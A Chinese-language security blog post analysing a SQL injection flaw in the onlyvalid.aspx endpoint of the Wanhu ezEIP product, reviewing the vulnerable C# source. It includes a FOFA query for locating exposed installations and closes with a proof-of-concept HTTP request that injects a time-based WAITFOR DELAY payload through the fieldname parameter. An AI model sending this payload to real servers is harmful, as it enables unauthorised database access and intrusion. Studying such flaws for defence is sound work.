---
title: "万户ezEIP onlyvalid.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/ezEIP-whir_system-onlyvalid-fieldname-sqli.html
asset_dir: embedded-base64
---

# 漏洞简介

万户ezEIP是一种企业资源规划[软件](#)，旨在帮助企业管理其各个方面的业务流程。它提供了一套集成的解决方案，涵盖了财务、供应链管理、销售和市场营销、人力资源等各个领域。万户ezEIP onlyvalid.aspx 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，攻击者除了可以利用SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

编程

# 影响版本

# fofa语法

> app="万户网络-ezEIP" || (body="ezEIP"||header="ezEIP") && server="IIS"

# 漏洞分析

查看 Whir\_System/Ajax/content/onlyValid.aspx.cs 内容如下

```
public partial class whir_system_ajax_content_onlyValid : System.Web.UI.Page
{
    public int ColumnId { get; set; }
    public int PrimaryValue { get; set; }
    public string FieldName { get; set; }
    public string FieldValue { get; set; }

    protected void Page_Load(object sender, EventArgs e)
    {
        ColumnId = RequestUtil.Instance.GetQueryInt("columnid", 0);
        PrimaryValue = RequestUtil.Instance.GetQueryInt("primaryValue", 0);
        FieldName = RequestUtil.Instance.GetQueryString("fieldname");
        FieldValue = RequestUtil.Instance.GetQueryString("fieldvalue");

        if (FieldName.IsSafeSqlaParms())
            Response.Write("存在非法字符串！");
        else
            WriteExist();
    }

    private void WriteExist()
    {
        Model model = ServiceFactory.ModelService.GetModelByColumnId(ColumnId);
        if (model == null || FieldValue.IsEmpty())
        {
            Response.Write("{\"valid\":true}");
            return;
        }

        string sql = "SELECT COUNT(1) FROM {0} WHERE {1}=@0 AND {0}_PID<>@2 AND TypeID=@1".FormatWith(model.TableName, FieldName);
        int count = DbHelper.CurrentDb.ExecuteScalar<object>(sql, FieldValue, ColumnId, PrimaryValue).ToInt();
        if (count > 0)
        {
            Response.Write("{\"valid\":false}");
            return;
        }

        Response.Write("{\"valid\":true}");
        return;
    }
}
```

四个参数中 ColumnId 和 PrimaryValue 均为 INT 整型，后两个 FieldName 和 FieldValue 为 string 型。

软件

接下来有个 IsSafeSqlaParms() 判断 fieldvalue 是否安全，但是没有找到对应的函数。。。

继续往下看 WriteExist 函数

如果 GetModelByColumnId(ColumnId) 方法返回null或者fieldvalue值为空则直接打印`{"valid":true}` 然后返回结束流程。

否则进入 sql 语句处理

```
string sql = "SELECT COUNT(1) FROM {0} WHERE {1}=@0 AND {0}_PID<>@2 AND TypeID=@1".FormatWith(model.TableName, FieldName);
```

这里使用了类似于 .NET 中 string.Format 的自定义方法 `FormatWith` 对 SQL 模板字符串进行格式化替换。注意：

- 模板字符串中的 **{0}** 和 **{1}** 属于格式化占位符，它们的替换值由 FormatWith 方法提供。
- 根据传入的参数：
  - **{0}** 将被替换为 **model.TableName**
  - **{1}** 将被替换为 **FieldName**

格式化完成后的 SQL 语句（假设 model.TableName="Users"，FieldName="UserName"）变为：

数据管理

```
SELECT COUNT(1) FROM Users WHERE UserName=@0 AND Users_PID<>@2 AND TypeID=@1
```

这里需要注意两点：

- 模板中的 **{0}** 和 **{1}** 均已被替换，得到实际的表名和字段名；
- **@0、@1、@2** 这三个仍保留在 SQL 字符串中，它们不是被 FormatWith 替换，而是数据库参数的占位符。

当前面提到的 model 满足条件后，这里的 FieldName 就存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，因为其直接拼接在 where 语句后作为条件拼接进SQL语句中。

再看紧接着的 ExecuteScalar 的参数绑定

```
int count = DbHelper.CurrentDb.ExecuteScalar<object>(sql, FieldValue, ColumnId, PrimaryValue).ToInt();
```

在这行代码中，通过 ADO.NET 的参数化查询方式，为 SQL 语句中参数占位符赋值。这里的参数和 SQL 语句中的 **@0、@1、@2** 是一一对应的（顺序对应）：

计算机服务器

- 第一个参数 **FieldValue** 对应 SQL 语句中的 **@0** → 表示条件 "UserName=@0" 中，@0 绑定的是 FieldValue
- 第二个参数 **ColumnId** 对应 SQL 语句中的 **@1** → 表示条件 "TypeID=@1" 中，@1 绑定的是 ColumnId
- 第三个参数 **PrimaryValue** 对应 SQL 语句中的 **@2** → 表示条件 "Users\_PID<>@2" 中，@2 绑定的是 PrimaryValue

使用参数化查询的方式，且其中有两个参数还是 整型 ，因此这里不存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")漏洞。

总结下这两个SQL的处理就是：

首先，通过 FormatWith 方法，把 SQL 模板中的 {0} 与 {1} 分别替换为具体的表名和字段名；

接着，在执行 SQL 查询时，通过参数化查询，把 FieldValue、ColumnId、PrimaryValue 分别绑定给 SQL 中的参数 @0、@1、@2，从而构造出最终的查询语句并执行。

# 漏洞复现

条件：

- 一个存在的 columnid
- IsSafeSqlaParms()函数不存在或者绕过过滤 亦或过滤无效？

## POC

> 理论POC
>
> 编程

```
POST /whir_system/ajax/content/onlyvalid.aspx HTTP/1.1
Host: ezeip.mrxn.net
Content-Type: application/x-www-form-urlencoded

fieldname=1%3d1;WAITFOR+DELAY'0:0:5'--&fieldvalue=1&columnid=1&primaryValue=1
```
